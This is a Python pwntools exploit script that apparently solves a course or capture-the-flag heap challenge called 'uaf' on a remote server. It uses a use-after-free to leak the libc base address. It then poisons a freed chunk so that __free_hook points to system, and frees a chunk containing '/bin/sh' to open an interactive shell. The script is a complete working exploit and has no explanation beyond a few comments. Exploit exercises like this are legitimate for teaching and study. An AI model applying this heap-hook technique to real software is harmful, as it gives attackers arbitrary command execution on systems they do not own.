from pwn import *
from typing import Tuple

context.log_level = 'debug'
context.binary = elf = ELF('./uaf')
libc = ELF('./libc-2.31.so')

REMOTE = 1
DEBUG = 1

if REMOTE:
    p = remote('8.154.20.109', 10402)
    p.sendlineafter(b'StudentID', b'3220103784')
else:
    p = process('./uaf')

def AddUser(name: bytes, password: bytes, size: bytes, intro: bytes, motto: bytes) -> int:
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b'name > ', name)
    p.sendlineafter(b'password > ', password)
    p.sendlineafter(b'introduction size > ', str(size).encode())
    p.sendlineafter(b'introduction > ', intro)
    p.sendlineafter(b'motto > ', motto)
    p.recvuntil(b"at index ", drop=True)
    data = p.recvline().strip()
    return int(data)

def ShowUser(index: int, password: bytes) -> Tuple[bytes, bytes, bytes]:
    p.recvuntil(b"[ 5 ] leave\n> ")
    p.sendline(b"3")
    p.recvuntil(b"index > ")
    p.sendline(str(index))
    p.recvuntil(b"password > ")
    p.sendline(password)
    p.recvuntil(b"user name: ")
    recv_name = p.recvline().strip()
    p.recvuntil(b"user motto: ")
    recv_motto = p.recvline().strip()
    p.recvuntil(b"user intro: ")
    recv_intro = p.recvline().strip()
    return recv_name, recv_motto, recv_intro

def DeleteUser(index: int, password: bytes):
   p.sendlineafter(b'> ', b'2') 
   p.sendlineafter(b'index > ', str(index).encode())
   p.sendlineafter(b'password > ', password)

def EditUser(index: int, password: bytes, name: bytes, intro: bytes, motto: bytes):
   p.sendlineafter(b'> ', b'4')
   p.sendlineafter(b'index > ', str(index).encode())
   p.sendlineafter(b'password > ', password) 
   p.sendlineafter(b'name > ', name)
   p.sendlineafter(b'introduction > ', intro)
   p.sendlineafter(b'motto > ', motto)

ARENA_OFFSET = 0x60
HOOK_OFFSET = 0x10
LARGE_CHUNK_SIZE = 2048    # 用于进入 unsorted bin 的大块
SMALL_CHUNK_SIZE = 32      # 用于 astbin 的小块
CONTROL_CHUNK_SIZE = 40

idx1 = AddUser(b"user1", b"1111", LARGE_CHUNK_SIZE, b"AAAA", b"aaaa")
idx2 = AddUser(b"user2", b"2222", SMALL_CHUNK_SIZE, b"BBBB", b"bbbb")
DeleteUser(idx1, b"1111")
DeleteUser(idx2, b"2222")

memory_leak = ShowUser(idx1, b"1111")[2]

if DEBUG:
    log.info(f"Show User intro: {memory_leak}")

# leak libc address
main_arena = u64(memory_leak[:8]) - ARENA_OFFSET
libc.address = main_arena - libc.sym["__malloc_hook"] - HOOK_OFFSET
log.info(f"libc address: {hex(libc.address)}")

EditUser(idx2, b"2222", p64(libc.sym["__free_hook"]), b"bbbb", b"bbbb")

idx3 = AddUser(b"user3", b"3333", CONTROL_CHUNK_SIZE, b"CCCC", b"cccc")
idx4 = AddUser(p64(libc.sym["system"]), b"4444", SMALL_CHUNK_SIZE, b"/bin/sh\0", b"dddd")

DeleteUser(idx4, b"4444")
p.interactive()
